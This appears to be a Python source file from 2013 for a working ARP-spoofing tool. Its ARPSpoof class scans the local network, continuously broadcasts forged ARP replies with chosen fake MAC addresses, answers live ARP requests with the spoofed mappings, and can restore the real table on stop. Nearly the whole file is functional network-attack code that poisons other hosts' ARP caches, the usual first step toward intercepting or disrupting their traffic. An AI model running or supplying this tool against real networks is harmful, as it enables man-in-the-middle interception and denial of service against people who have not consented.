#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# spoof network with fake mac addresses
# copyright ¢ 2013 by Domen Ipavec

import connection, arp, interfaces, arpscan

import threading, time

class ARPSpoof:
	def __init__(self, ifname):
		# get interface and addresses
		self.interface = interfaces.findInterface(ifname)
		self.mac_addresses = interfaces.MAC(self.interface)
		self.ip_addresses = interfaces.IPv4(self.interface)
		
		# scan network for current mac data
		self.original_data = arpscan.scan(self.interface)
		
		# store spoof data in format:
		# [ip][targetComputerMac] = mac
		self.spoof_data = {}
		
		# ethernet connection
		self.connection = connection.EthernetConnection(self.mac_addresses['broadcast'], connection.ETHERTYPE_ARP, self.interface)
		
		# spoofing not active
		self.spoof = False
		
		# send full table every second in send thread
		self.sendEvent = threading.Event()
		self.sendThread = threading.Thread(target=self.sendFull)
		self.sendThread.daemon = True
		self.sendThread.start()
		
		# receive arp requests and send responds in receive thread
		self.receiveThread = threading.Thread(target=self.receiveWithSend)
		self.receiveThread.daemon = True
		self.receiveThread.start()
	
	# start spoofing
	def start(self):
		self.spoof = True
		self.sendEvent.set()
	
	# stop spoofing
	def stop(self):
		self.spoof = False
		self.sendEvent.clear()
		
		# send original table 3 times every second 
		# (for some reason it does not work when sent once)
		for x in range(3):
			time.sleep(1)
			for ip in self.spoof_data:
				self.sendReal(ip)
	
	# add spoof
	def addSpoof(self, targetComputerMac, ip, mac):
		if ip not in self.spoof_data:
			self.spoof_data[ip] = {}
		self.spoof_data[ip][targetComputerMac] = mac
	
	# send full table with spoof every second or when sendEvent is set
	def sendFull(self):
		while 1:
			if self.spoof:
				self.sendEvent.wait(1)
				self.sendEvent.clear()
				for ip in self.original_data:
					if  ip in self.spoof_data:
						self.sendSpoof(ip)
					else:
						self.sendReal(ip)

	# send real mac to all ips
	# (sending to broadcast sometimes does not work)
	def sendReal(self, ip):
		for target_ip in self.original_data:
			self.sendRealTo(ip, target_ip)
	
	# send spoof or real address of ip to all ips
	def sendSpoof(self, ip):
		broadcast = self.mac_addresses['broadcast'] in self.spoof_data[ip]
		for target_ip in self.original_data:
			if self.original_data[target_ip] in self.spoof_data[ip] or broadcast:
				self.sendSpoofTo(ip, target_ip)
			else:
				self.sendRealTo(ip, target_ip)
	
	# send real mac of ip to target_ip
	def sendRealTo(self, ip, target_ip):
		if target_ip != ip:
			self.connection.send(arp.ARP(self.original_data[ip], ip, self.original_data[target_ip], target_ip, arp.ARP_REPLY), self.original_data[target_ip])
	
	# send spoof mac of ip to target_ip
	def sendSpoofTo(self, ip, target_ip):
		if target_ip != ip:
			# try getting spoof mac for target mac, otherwise use broadcast
			try:
				spoof_mac = self.spoof_data[ip][self.original_data[target_ip]]
			except:
				spoof_mac = self.spoof_data[ip][self.mac_addresses['broadcast']]
			self.connection.send(arp.ARP(spoof_mac, ip, self.original_data[target_ip], target_ip, arp.ARP_REPLY), self.original_data[target_ip])
		
	# receive arp packets and respond
	def receiveWithSend(self):
		while 1:
			if self.spoof:
				# get ips from arp packet
				arp_packet = arp.ARP(self.connection.receive()[3])
				
				# sometimes we get different arp packets
				if arp_packet.htype != arp.HTYPE_ETHERNET or arp_packet.ptype != arp.PTYPE_IPv4:
					continue
				
				source_ip = arp_packet.spa
				target_ip = arp_packet.tpa
				
				# respond on requests from ip that has modified mac
				if source_ip in self.spoof_data:
					self.sendSpoof(source_ip)
				
				# respond on requests for ip that has modified mac
				if target_ip in self.spoof_data:					
					self.sendSpoof(target_ip)
				
				# if request from unknown ip, add it and send table
				if source_ip not in self.original_data:
					self.original_data[source_ip] = arp_packet.sha
					self.sendEvent.set()
